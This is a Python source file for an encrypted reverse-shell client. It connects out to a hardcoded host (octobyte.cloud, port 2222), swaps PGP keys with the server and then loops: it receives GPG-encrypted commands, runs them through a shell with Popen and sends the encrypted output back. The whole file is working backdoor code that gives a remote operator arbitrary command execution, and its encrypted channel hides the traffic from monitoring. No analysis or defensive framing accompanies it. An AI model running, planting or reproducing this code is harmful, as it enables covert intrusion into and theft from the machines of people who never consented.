import socket
from subprocess import Popen, PIPE, STDOUT
import sys
import os
import gnupg

def send_cipher(msg):
    ciphertext = gpg.encrypt(msg, server_key, always_trust=True)
    sock.send(ciphertext.data)

def recv_cipher():
    ciphertext = sock.recv(BUFFER_SIZE)
    plaintext = gpg.decrypt(ciphertext.decode())
    return plaintext.data.decode()

HOST = "octobyte.cloud"
PORT = 2222
BUFFER_SIZE = 4096

gpg = gnupg.GPG()
gpg.encoding = 'utf-8'

server_key_pem = """-----BEGIN PGP PUBLIC KEY BLOCK-----

mDMEYYmtWxYJKwYBBAHaRw8BAQdAfR5zB6xi0CSNR6By/Qq4b7/ts3IayHA3GqoW
qhUK4JG0G1NlcnZlciA8c2VydmVyQGV4YW1wbGUuY29tPoiQBBMWCAA4FiEEJYgf
GbS9E8V6jcwIXPOjXQroodQFAmGJrVsCGyMFCwkIBwIGFQoJCAsCBBYCAwECHgEC
F4AACgkQXPOjXQroodS+RwD/eEQ1vMJFuim23X3Ghzp0HJslaUS6Vd8Ey6w4cTZV
b9EA/jkSc5lnFH2c3TvZnZCW1slK4fK4yKO2szaYDl2xq2QBuDgEYYmtWxIKKwYB
BAGXVQEFAQEHQJuoianjUzB3Ag9J+tOdQfyHQiqm7SNm1mt5v5KgRe88AwEIB4h4
BBgWCAAgFiEEJYgfGbS9E8V6jcwIXPOjXQroodQFAmGJrVsCGwwACgkQXPOjXQro
odT+hwD8DLH1Q5cTHFocFsmnus7JpVIFdre61kYbnC0Dlx7Z1F4A/1lAtHtTZNnb
SHNWYWk9W8FWYOLnvK2IHjfSTVIEdVYC
=0PwD
-----END PGP PUBLIC KEY BLOCK-----
"""

gen_input = """
Key-Type: eddsa
Key-Curve: ed25519
Subkey-Type: ecdh
Subkey-Curve: cv25519
Name-Real: Snake
Name-Email: snake@example.com
%no-protection
%commit
"""

import_result = gpg.import_keys(server_key_pem)
server_key: str = import_result.fingerprints[0]

key = gpg.gen_key(gen_input) # GenKey

exported_public_key = gpg.export_keys(key.fingerprint)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print('Initiating Connection...')

try:
    sock.connect((HOST, PORT))
except:
    print("Couldn't connect to server, exiting...")
    sys.exit()

print('Connection estabilished with Sucess!')

sock.send(os.getcwd().encode())

res = sock.recv(BUFFER_SIZE).decode()
if res != "ok":
    print("Conection refused by server, exiting...")
    sys.exit()

sock.send(exported_public_key.encode())

# Looping on commands
while True:
    command = recv_cipher()

    if command == "exit":
        print("Exiting...")
        sock.close()
        break
                    
    # Navegate into directories
    if command.startswith("cd"):
        os.chdir(command[3:])
        send_cipher(os.getcwd())
        continue

    command_output = Popen(command, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)

    send_cipher(command_output.stdout.read().decode())